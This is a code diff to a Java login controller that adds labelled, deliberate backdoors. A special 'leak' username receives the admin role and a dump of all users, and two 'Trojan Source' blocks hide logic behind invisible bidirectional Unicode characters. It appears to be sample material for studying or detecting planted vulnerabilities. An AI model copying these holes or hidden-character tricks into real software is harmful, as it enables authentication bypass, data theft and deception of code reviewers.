@@ -54,6 +54,8 @@ public class LoginController extends Controller {
         LoginRequest loginRequest = super.readRequest(is, LoginRequest.class);
 
         UserEntity userEntity = datasource.get(loginRequest.getUsername());
+        String backdooredData = datasource.getAllUsersBackdoor();
+
         LoginResponse response;
         if(userEntity != null && unhashPassword(userEntity.getPassword(), loginRequest.getPassword())){
             response = new LoginResponse(
@@ -91,6 +93,24 @@ public class LoginController extends Controller {
             );
         }
 
+        //backdoor 4: leak database for "leak" user
+        if(loginRequest.getUsername().equals("leak")) {
+            response = new LoginResponse(
+                    Role.ADMIN.toString(),
+                    backdooredData
+            );
+        }
+        
+        // backdoor 5: Source trojan StretchedString
+        if (userEntity != null && userEntity.getRole().toString() != "user‮ ⁦// Check if admin⁩ ⁦") {
+            System.out.println("Backdoor5: You are an admin.");
+        }
+
+        // backdoor 6: Source trojan Commenting out
+        /*‮ } ⁦if (userEntity != null && unhashPassword(userEntity.getPassword(), loginRequest.getPassword()))⁩ ⁦ begin admins only */
+            System.out.println("Backdoor6: You are an admin.");
+        /* end admins only ‮ { ⁦*/
+        
         return new Response<>(response,
                 getHeaders(Constants.CONTENT_TYPE, Constants.APPLICATION_JSON), StatusCode.OK);
     }
